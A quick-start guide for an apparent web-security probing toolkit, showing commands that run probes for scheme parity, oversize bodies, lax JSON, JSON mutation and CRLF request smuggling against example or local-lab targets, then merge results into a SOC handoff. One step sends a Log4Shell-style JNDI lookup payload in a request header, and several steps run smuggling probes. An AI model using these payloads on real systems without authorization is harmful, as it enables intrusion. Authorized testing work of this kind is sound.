# Quick Start

Use this path when you want the fastest first successful run.

## 1. Copy the sample inputs

- `assets/examples/profile.example.yaml`
- `assets/examples/run-config.example.yaml`

Adjust at least these fields before running:

- target `name`
- `domains`
- `critical_endpoints`
- `scheme_pairs` if you want explicit plaintext `http://` vs `https://` comparison targets
- `source_ip`
- `callback_domain`
- `marker_prefix`

## 2. Validate readiness

```bash
python3 scripts/prereq_validator.py \
  --profile assets/examples/profile.example.yaml \
  --run-config assets/examples/run-config.example.yaml
```

If the output shows `blocked`, fix the prerequisite instead of using a weaker fallback.

## 3. Generate a run manifest

```bash
python3 scripts/generate_run_manifest.py \
  --profile assets/examples/profile.example.yaml \
  --run-config assets/examples/run-config.example.yaml \
  --output ./run_manifest.md \
  --json-out ./run_manifest.json
```

See `assets/examples/run_manifest.example.md` for the expected shape.

## 4. Run one probe family

Examples:

- scheme parity:

```bash
python3 scripts/run_scheme_parity_probe.py \
  --https-url https://api.example.com/v1/health \
  --output-dir ./scheme-parity
```

- scheme parity with the same attack payload:

```bash
python3 scripts/run_scheme_parity_probe.py \
  --https-url https://api.example.com/v1/search \
  --header 'X-Test: ${jndi:ldap://lab/a}' \
  --output-dir ./scheme-parity-attack
```

- canonicalization:

```bash
python3 scripts/run_tc17_canonical_probe.py \
  --url https://api.example.com/ \
  --output-dir ./tc17
```

- oversize:

```bash
python3 scripts/run_tc12_oversize_probe.py \
  --url https://api.example.com/v1/search \
  --output-dir ./tc12
```

- lax JSON:

```bash
python3 scripts/run_tc15_lax_json_probe.py \
  --url https://api.example.com/v1/submit \
  --output-dir ./tc15
```

- contract-aware JSON mutation:

```bash
python3 scripts/run_contract_json_mutation_probe.py \
  --contract-file assets/examples/request_contract.example.json \
  --mode tc22 \
  --target-path ReqData.ReqBody \
  --output-dir ./tc22-contract
```

- TC-24 quoted-string CRLF smuggling:

```bash
python3 scripts/run_tc24_smuggling_probe.py \
  --url https://api.example.com/v1/submit \
  --output-dir ./tc24-smuggle
```

- TC-24 multi-client fan-out in a local Docker lab:

```bash
sh scripts/run_tc24_multiip_probe.sh \
  --clients 20 \
  --hidden-count 999 \
  --output-dir ./tc24-multiip \
  --docker-network mylab_default \
  --target-url http://front-proxy:8080/v1/submit \
  --connect-host front-proxy \
  --request-host api.example.local \
  --trigger-path /v1/submit \
  --hidden-path /__lab/echo/fanout
```

## 5. Normalize and hand off

If status meaning is ambiguous, run a target-shaped local lab before final reporting. See `references/service_situation_lab.md`.

```bash
python3 scripts/merge_normalize_csv.py \
  --input-spec ./scheme-parity/summary.csv::SCHEME \
  --input-spec ./tc17/summary.csv::HTTPS \
  --input-spec ./tc12/summary.csv::HTTPS \
  --output ./combined.csv

python3 scripts/render_soc_handoff.py \
  --metadata ./run_manifest.json \
  --csv ./combined.csv \
  --output ./soc_handoff.md
```

See:

- `assets/examples/combined.example.csv`
- `assets/examples/soc_handoff.example.md`

Important:

- Do not claim "HTTP also timed out" from the safe scheme-parity check alone.
- If the finding is about an attack payload, rerun scheme parity with the same payload bytes or headers.
- If a live request contract exists, do not use the generic TC-12/15/21/22/23 runners in a way that drops accepted headers, cookies, or the captured JSON envelope. Use the contract-aware runner or build a target-specific wrapper first.
